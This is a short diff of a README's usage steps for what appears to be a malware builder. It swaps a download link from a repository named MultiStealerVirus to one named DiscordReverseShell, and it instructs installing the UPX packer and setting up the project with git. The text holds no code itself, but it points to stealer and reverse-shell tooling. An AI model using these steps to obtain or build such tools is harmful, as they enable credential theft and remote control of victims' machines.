@@ -66,7 +66,7 @@
 
 ## Usage
 
-1. Download builder [here](https://github.com/Josakko/MultiStealerVirus/releases/) and UPX [here](https://upx.github.io/) and put it into `C:\UPX`.
+1. Download builder [here](https://github.com/Josakko/DiscordReverseShell/releases) and UPX [here](https://upx.github.io/) and put it into `C:\UPX`.
 
 2. Setup environment, download git to clone the repo automatically or clone it manually, script in this command will skip cloning repo if git isnt installed, to install git go [here](https://git-scm.com/download/win) then run following command in CMD:
 
